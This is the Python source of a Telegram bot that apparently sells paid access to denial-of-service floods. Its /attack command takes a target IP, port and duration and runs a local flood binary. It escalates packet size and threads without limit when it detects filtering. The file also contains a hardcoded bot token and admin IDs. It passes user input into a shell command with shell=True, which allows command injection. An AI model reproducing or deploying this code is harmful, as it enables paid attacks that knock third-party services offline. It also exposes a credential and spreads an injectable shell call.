import telebot
import datetime
import subprocess
import threading
import pytz
import json
import os

IST = pytz.timezone('Asia/Kolkata')
BOT_TOKEN = "7520138270:AAFAdGncvbChu5zwtWqnP1CYd_IAAkHZzMM"
admin_id = ["6258297180", "1807014348"]
bot = telebot.TeleBot(BOT_TOKEN)

users = {}
keys = {}
authorized_users = {}
resellers = {}
last_attack_time = {}
COOLDOWN_PERIOD = 10

def load_json_files():
    global users, keys, authorized_users, resellers
    for file, default in [
        ('users.json', {}),
        ('keys.json', {}),
        ('authorized_users.json', {}),
        ('resellers.json', {})
    ]:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump(default, f)
        with open(file, 'r') as f:
            try:
                globals()[file.split('.')[0]] = json.load(f)
            except json.JSONDecodeError:
                globals()[file.split('.')[0]] = default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

def record_command_logs(user_id, command, target, port, time):
    log_entry = {
        'user_id': user_id,
        'command': command,
        'target': target,
        'port': port,
        'time': time,
        'timestamp': datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    }
    with open('log.txt', 'a') as f:
        f.write(json.dumps(log_entry) + '\n')

def log_command(user_id, target, port, time):
    print(f"User {user_id} executed attack: {target}:{port} for {time} seconds")

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "Attack has finished.")

def execute_attack(target, port, time, packet_size, threads, chat_id, username, last_attack_time, user_id, retry_count=0):
    try:
        if time > 1800:
            bot.send_message(chat_id, "Error: use less than 1800 seconds")
            return
        if retry_count > 2:
            bot.send_message(chat_id, "Error: Max retry attempts reached. Attack failed.")
            return
        if packet_size < 800:
            packet_size = 800  # Enforce minimum packet size
        if threads < 512:
            threads = 512  # Enforce minimum threads

        print(f"Attack started at {datetime.datetime.now(IST)}: {target}:{port}, Packet Size: {packet_size}, Threads: {threads}")
        full_command = f"./Rohan {target} {port} {time} {packet_size} {threads}"
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot.send_message(chat_id, f"Attack command sent: {target}:{port}, {time}s, Packet Size: {packet_size}, Threads: {threads}")
        stdout, stderr = process.communicate()
        output = stdout.decode()
        error = stderr.decode()
        print(f"Attack command output: {output}, errors: {error}")

        # Parse failure rate from Rohan output
        failure_rate = 0.0
        for line in output.splitlines():
            if line.startswith("FAILURE_RATE:"):
                try:
                    failure_rate = float(line.split(":")[1])
                except ValueError:
                    failure_rate = 0.0
                break

        # Check if attack was filtered (failure rate 90% to 100%)
        if failure_rate >= 90.0 and failure_rate <= 100.0:
            bot.send_message(chat_id, f"Warning: High failure rate ({failure_rate:.2f}%). Increasing packet size/threads and retrying...")
            new_packet_size = packet_size * 2  # Double packet size, no upper limit
            new_threads = threads + 256  # Add 256 threads, no upper limit
            print(f"Retrying with Packet Size: {new_packet_size}, Threads: {new_threads}")
            execute_attack(target, port, time, new_packet_size, new_threads, chat_id, username, last_attack_time, user_id, retry_count + 1)
            return
        elif failure_rate > 50.0:
            bot.send_message(chat_id, f"Notice: Moderate failure rate ({failure_rate:.2f}%). Attack completed but may have been partially filtered.")

        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: {threads}\nFailure Rate: {failure_rate:.2f}%\nAttacker: @{username}"
        bot.send_message(chat_id, response)
        threading.Timer(time, send_attack_finished_message, [chat_id]).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
    except Exception as e:
        print(f"Attack error: {str(e)}")
        bot.send_message(chat_id, f"Error executing attack: {str(e)}")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    username = message.from_user.username or f"UserID_{user_id}"
    has_access = False
    if user_id in admin_id:
        has_access = True
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    if not has_access:
        bot.send_message(chat_id, "Unauthorized Access! Use /redeem <key_name> or buy access for 50₹. DM @Rahul_618.")
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            bot.send_message(chat_id, f"Cooldown in effect, wait {int(remaining_cooldown)} seconds")
            return
    command = message.text.split()
    if len(command) != 4:
        bot.send_message(chat_id, "Usage: /attack <ip> <port> <time>")
        return
    try:
        target = command[1]
        port = int(command[2])
        time = int(command[3])
        packet_size = 800  # Default packet size
        threads = 512  # Default threads
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        execute_attack(target, port, time, packet_size, threads, chat_id, username, last_attack_time, user_id)
    except ValueError:
        bot.send_message(chat_id, "Invalid port or time format.")

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id, "Welcome to the Bot! Use /attack <ip> <port> <time> to start an attack. DM @Rahul_618 for access.")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
    Bot Commands:
    - /start - Start the bot
    - /help - Show this guide
    - /attack <ip> <port> <time> - Launch an attack (authorized users only)
    - /redeem <key_name> - Redeem a key for access
    Contact @Rahul_618 for support.
    """
    bot.send_message(message.chat.id, help_text)

load_json_files()
bot.polling()